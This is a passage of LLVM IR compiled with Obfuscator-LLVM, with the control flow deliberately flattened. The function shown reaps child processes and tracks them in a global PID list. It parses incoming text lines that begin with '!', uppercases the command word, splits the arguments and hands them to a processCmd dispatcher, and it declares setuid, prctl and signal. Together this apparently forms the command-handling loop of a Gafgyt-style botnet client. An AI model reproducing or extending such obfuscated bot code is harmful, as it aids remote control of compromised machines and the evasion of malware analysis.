  %106 = load i32, i32* %105, align 4
  %107 = call i32 @waitpid(i32 %106, i32* null, i32 1)
  %108 = icmp sgt i32 %107, 0
  %109 = select i1 %108, i32 620533529, i32 1443261915
  store i32 %109, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* %12, align 4
  %112 = add nsw i32 %111, 1
  store i32 %112, i32* %14, align 4
  store i32 -1040725732, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load i32, i32* %14, align 4
  %115 = zext i32 %114 to i64
  %116 = load i64, i64* @numpids, align 8
  %117 = icmp ult i64 %115, %116
  %118 = select i1 %117, i32 1872853857, i32 -592258859
  store i32 %118, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i32*, i32** @pids, align 8
  %121 = load i32, i32* %14, align 4
  %122 = zext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  %124 = load i32, i32* %123, align 4
  %125 = load i32*, i32** @pids, align 8
  %126 = load i32, i32* %14, align 4
  %127 = sub i32 %126, 1
  %128 = zext i32 %127 to i64
  %129 = getelementptr inbounds i32, i32* %125, i64 %128
  store i32 %124, i32* %129, align 4
  store i32 -449591633, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i32, i32* %14, align 4
  %132 = add i32 %131, 1
  store i32 %132, i32* %14, align 4
  store i32 -1040725732, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i32*, i32** @pids, align 8
  %135 = load i32, i32* %14, align 4
  %136 = sub i32 %135, 1
  %137 = zext i32 %136 to i64
  %138 = getelementptr inbounds i32, i32* %134, i64 %137
  store i32 0, i32* %138, align 4
  %139 = load i64, i64* @numpids, align 8
  %140 = add i64 %139, -1
  store i64 %140, i64* @numpids, align 8
  %141 = load i64, i64* @numpids, align 8
  %142 = add i64 %141, 1
  %143 = mul i64 %142, 4
  %144 = call noalias i8* @malloc(i64 %143) #5
  %145 = bitcast i8* %144 to i32*
  store i32* %145, i32** %13, align 8
  store i32 0, i32* %14, align 4
  store i32 1270706983, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %147 = load i32, i32* %14, align 4
  %148 = zext i32 %147 to i64
  %149 = load i64, i64* @numpids, align 8
  %150 = icmp ult i64 %148, %149
  %151 = select i1 %150, i32 1358798603, i32 -413499305
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %153 = load i32*, i32** @pids, align 8
  %154 = load i32, i32* %14, align 4
  %155 = zext i32 %154 to i64
  %156 = getelementptr inbounds i32, i32* %153, i64 %155
  %157 = load i32, i32* %156, align 4
  %158 = load i32*, i32** %13, align 8
  %159 = load i32, i32* %14, align 4
  %160 = zext i32 %159 to i64
  %161 = getelementptr inbounds i32, i32* %158, i64 %160
  store i32 %157, i32* %161, align 4
  store i32 -1608333273, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load i32, i32* %14, align 4
  %164 = add i32 %163, 1
  store i32 %164, i32* %14, align 4
  store i32 1270706983, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  %166 = load i32*, i32** @pids, align 8
  %167 = bitcast i32* %166 to i8*
  call void @free(i8* %167) #5
  %168 = load i32*, i32** %13, align 8
  store i32* %168, i32** @pids, align 8
  store i32 1443261915, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  store i32 685874355, i32* %switchVar
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  %171 = load i32, i32* %12, align 4
  %172 = add nsw i32 %171, 1
  store i32 %172, i32* %12, align 4
  store i32 -2082199218, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load i32, i32* %11, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %175
  store i8 0, i8* %176, align 1
  %177 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim2(i8* %177)
  %178 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %179 = call i8* @strstr(i8* %178, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.305, i32 0, i32 0)) #9
  %180 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %181 = icmp eq i8* %179, %180
  %182 = select i1 %181, i32 -356179235, i32 1208705354
  store i32 %182, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  store i32 -1403010079, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %186 = call i8* @strstr(i8* %185, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.325, i32 0, i32 0)) #9
  %187 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %188 = icmp eq i8* %186, %187
  %189 = select i1 %188, i32 236699685, i32 1766374169
  store i32 %189, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  call void @exit(i32 0) #12
  unreachable

; <label>:191:                                    ; preds = %loopEntry
  %192 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %192, i8** %15, align 8
  %193 = load i8*, i8** %15, align 8
  %194 = load i8, i8* %193, align 1
  %195 = zext i8 %194 to i32
  %196 = icmp eq i32 %195, 33
  %197 = select i1 %196, i32 -682087642, i32 -845455367
  store i32 %197, i32* %switchVar
  br label %loopEnd

; <label>:198:                                    ; preds = %loopEntry
  %199 = load i8*, i8** %15, align 8
  %200 = getelementptr inbounds i8, i8* %199, i64 1
  store i8* %200, i8** %16, align 8
  store i32 -947461840, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = load i8*, i8** %16, align 8
  %203 = load i8, i8* %202, align 1
  %204 = zext i8 %203 to i32
  %205 = icmp ne i32 %204, 32
  %206 = select i1 %205, i32 1219974119, i32 -1123867244
  store i32 %206, i32* %switchVar
  store i1 false, i1* %.reg2mem3
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = load i8*, i8** %16, align 8
  %209 = load i8, i8* %208, align 1
  %210 = zext i8 %209 to i32
  %211 = icmp ne i32 %210, 0
  store i32 -1123867244, i32* %switchVar
  store i1 %211, i1* %.reg2mem3
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %.reload4 = load i1, i1* %.reg2mem3
  %213 = select i1 %.reload4, i32 -774981912, i32 2129226630
  store i32 %213, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %215 = load i8*, i8** %16, align 8
  %216 = getelementptr inbounds i8, i8* %215, i32 1
  store i8* %216, i8** %16, align 8
  store i32 -947461840, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  %218 = load i8*, i8** %16, align 8
  %219 = load i8, i8* %218, align 1
  %220 = zext i8 %219 to i32
  %221 = icmp eq i32 %220, 0
  %222 = select i1 %221, i32 -300742790, i32 -1778317062
  store i32 %222, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  store i32 -1403010079, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = load i8*, i8** %16, align 8
  store i8 0, i8* %225, align 1
  %226 = load i8*, i8** %15, align 8
  %227 = getelementptr inbounds i8, i8* %226, i64 1
  store i8* %227, i8** %16, align 8
  %228 = load i8*, i8** %15, align 8
  %229 = load i8*, i8** %16, align 8
  %230 = call i64 @strlen(i8* %229) #9
  %231 = getelementptr inbounds i8, i8* %228, i64 %230
  %232 = getelementptr inbounds i8, i8* %231, i64 2
  store i8* %232, i8** %15, align 8
  store i32 -1266151365, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load i8*, i8** %15, align 8
  %235 = load i8*, i8** %15, align 8
  %236 = call i64 @strlen(i8* %235) #9
  %237 = sub i64 %236, 1
  %238 = getelementptr inbounds i8, i8* %234, i64 %237
  %239 = load i8, i8* %238, align 1
  %240 = zext i8 %239 to i32
  %241 = icmp eq i32 %240, 10
  %242 = select i1 %241, i32 -157974779, i32 -1313539872
  store i32 %242, i32* %switchVar
  store i1 true, i1* %.reg2mem5
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  %244 = load i8*, i8** %15, align 8
  %245 = load i8*, i8** %15, align 8
  %246 = call i64 @strlen(i8* %245) #9
  %247 = sub i64 %246, 1
  %248 = getelementptr inbounds i8, i8* %244, i64 %247
  %249 = load i8, i8* %248, align 1
  %250 = zext i8 %249 to i32
  %251 = icmp eq i32 %250, 13
  store i32 -157974779, i32* %switchVar
  store i1 %251, i1* %.reg2mem5
  br label %loopEnd

; <label>:252:                                    ; preds = %loopEntry
  %.reload6 = load i1, i1* %.reg2mem5
  %253 = select i1 %.reload6, i32 -551835209, i32 1321953537
  store i32 %253, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = load i8*, i8** %15, align 8
  %256 = load i8*, i8** %15, align 8
  %257 = call i64 @strlen(i8* %256) #9
  %258 = sub i64 %257, 1
  %259 = getelementptr inbounds i8, i8* %255, i64 %258
  store i8 0, i8* %259, align 1
  store i32 -1266151365, i32* %switchVar
  br label %loopEnd

; <label>:260:                                    ; preds = %loopEntry
  %261 = load i8*, i8** %15, align 8
  store i8* %261, i8** %17, align 8
  store i32 -1873801324, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = load i8*, i8** %15, align 8
  %264 = load i8, i8* %263, align 1
  %265 = zext i8 %264 to i32
  %266 = icmp ne i32 %265, 32
  %267 = select i1 %266, i32 -370748066, i32 -1877634011
  store i32 %267, i32* %switchVar
  store i1 false, i1* %.reg2mem7
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %269 = load i8*, i8** %15, align 8
  %270 = load i8, i8* %269, align 1
  %271 = zext i8 %270 to i32
  %272 = icmp ne i32 %271, 0
  store i32 -1877634011, i32* %switchVar
  store i1 %272, i1* %.reg2mem7
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %.reload8 = load i1, i1* %.reg2mem7
  %274 = select i1 %.reload8, i32 712394891, i32 -2031844488
  store i32 %274, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  %276 = load i8*, i8** %15, align 8
  %277 = getelementptr inbounds i8, i8* %276, i32 1
  store i8* %277, i8** %15, align 8
  store i32 -1873801324, i32* %switchVar
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %279 = load i8*, i8** %15, align 8
  store i8 0, i8* %279, align 1
  %280 = load i8*, i8** %15, align 8
  %281 = getelementptr inbounds i8, i8* %280, i32 1
  store i8* %281, i8** %15, align 8
  %282 = load i8*, i8** %17, align 8
  store i8* %282, i8** %18, align 8
  store i32 1443440243, i32* %switchVar
  br label %loopEnd

; <label>:283:                                    ; preds = %loopEntry
  %284 = load i8*, i8** %18, align 8
  %285 = load i8, i8* %284, align 1
  %286 = icmp ne i8 %285, 0
  %287 = select i1 %286, i32 -1892181186, i32 -1415992017
  store i32 %287, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8*, i8** %18, align 8
  %290 = load i8, i8* %289, align 1
  %291 = zext i8 %290 to i32
  %292 = call i32 @toupper(i32 %291) #9
  %293 = trunc i32 %292 to i8
  %294 = load i8*, i8** %18, align 8
  store i8 %293, i8* %294, align 1
  %295 = load i8*, i8** %18, align 8
  %296 = getelementptr inbounds i8, i8* %295, i32 1
  store i8* %296, i8** %18, align 8
  store i32 1443440243, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  store i32 1, i32* %20, align 4
  %298 = load i8*, i8** %15, align 8
  %299 = call i8* @strtok(i8* %298, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.326, i32 0, i32 0)) #5
  store i8* %299, i8** %21, align 8
  %300 = load i8*, i8** %17, align 8
  %301 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  store i8* %300, i8** %301, align 16
  store i32 225928626, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  %303 = load i8*, i8** %21, align 8
  %304 = icmp ne i8* %303, null
  %305 = select i1 %304, i32 -1802700486, i32 -334464311
  store i32 %305, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load i8*, i8** %21, align 8
  %308 = load i8, i8* %307, align 1
  %309 = zext i8 %308 to i32
  %310 = icmp ne i32 %309, 10
  %311 = select i1 %310, i32 1509533436, i32 -990622072
  store i32 %311, i32* %switchVar
  br label %loopEnd

; <label>:312:                                    ; preds = %loopEntry
  %313 = load i8*, i8** %21, align 8
  %314 = call i64 @strlen(i8* %313) #9
  %315 = add i64 %314, 1
  %316 = call noalias i8* @malloc(i64 %315) #5
  %317 = load i32, i32* %20, align 4
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %318
  store i8* %316, i8** %319, align 8
  %320 = load i32, i32* %20, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %321
  %323 = load i8*, i8** %322, align 8
  %324 = load i8*, i8** %21, align 8
  %325 = call i64 @strlen(i8* %324) #9
  %326 = add i64 %325, 1
  call void @llvm.memset.p0i8.i64(i8* %323, i8 0, i64 %326, i32 1, i1 false)
  %327 = load i32, i32* %20, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %328
  %330 = load i8*, i8** %329, align 8
  %331 = load i8*, i8** %21, align 8
  %332 = call i8* @strcpy(i8* %330, i8* %331) #5
  %333 = load i32, i32* %20, align 4
  %334 = add nsw i32 %333, 1
  store i32 %334, i32* %20, align 4
  store i32 -990622072, i32* %switchVar
  br label %loopEnd

; <label>:335:                                    ; preds = %loopEntry
  %336 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.326, i32 0, i32 0)) #5
  store i8* %336, i8** %21, align 8
  store i32 225928626, i32* %switchVar
  br label %loopEnd

; <label>:337:                                    ; preds = %loopEntry
  %338 = load i32, i32* %20, align 4
  %339 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %338, i8** %339)
  %340 = load i32, i32* %20, align 4
  %341 = icmp sgt i32 %340, 1
  %342 = select i1 %341, i32 -974694523, i32 -69885820
  store i32 %342, i32* %switchVar
  br label %loopEnd

; <label>:343:                                    ; preds = %loopEntry
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  store i32 -20467335, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  %345 = load i32, i32* %22, align 4
  %346 = load i32, i32* %20, align 4
  %347 = icmp slt i32 %345, %346
  %348 = select i1 %347, i32 753621283, i32 -2004713495
  store i32 %348, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i32, i32* %22, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %351
  %353 = load i8*, i8** %352, align 8
  call void @free(i8* %353) #5
  store i32 -2039971263, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  %355 = load i32, i32* %22, align 4
  %356 = add nsw i32 %355, 1
  store i32 %356, i32* %22, align 4
  store i32 -20467335, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  store i32 -69885820, i32* %switchVar
  br label %loopEnd

; <label>:358:                                    ; preds = %loopEntry
  store i32 -845455367, i32* %switchVar
  br label %loopEnd

; <label>:359:                                    ; preds = %loopEntry
  store i32 -1403010079, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  store i32 450937577, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -1124375814, i32* %switchVar
  br label %loopEnd

; <label>:362:                                    ; preds = %loopEntry
  store i32 -1124375814, i32* %switchVar
  br label %loopEnd

; <label>:363:                                    ; preds = %loopEntry
  %364 = load i32, i32* %3, align 4
  ret i32 %364

loopEnd:                                          ; preds = %362, %361, %360, %359, %358, %357, %354, %349, %344, %343, %337, %335, %312, %306, %302, %297, %288, %283, %278, %275, %273, %268, %262, %260, %254, %252, %243, %233, %224, %223, %217, %214, %212, %207, %201, %198, %191, %184, %183, %173, %170, %169, %165, %162, %152, %146, %133, %130, %119, %113, %110, %101, %95, %94, %88, %84, %82, %78, %74, %69, %68, %67, %66, %65, %61, %56, %52, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #1

declare i32 @prctl(...) #2

declare i32 @waitpid(i32, i32*, i32) #2

; Function Attrs: nounwind
declare i32 @chdir(i8*) #1

; Function Attrs: nounwind
declare i32 @setuid(i32) #1

; Function Attrs: nounwind
declare i32 @seteuid(i32) #1

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #1

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146429923}
!2 = !{i32 -2146428795}
!3 = !{i32 -2146428104}
!4 = !{i32 -2146427355}
!5 = !{i32 -2146426416}
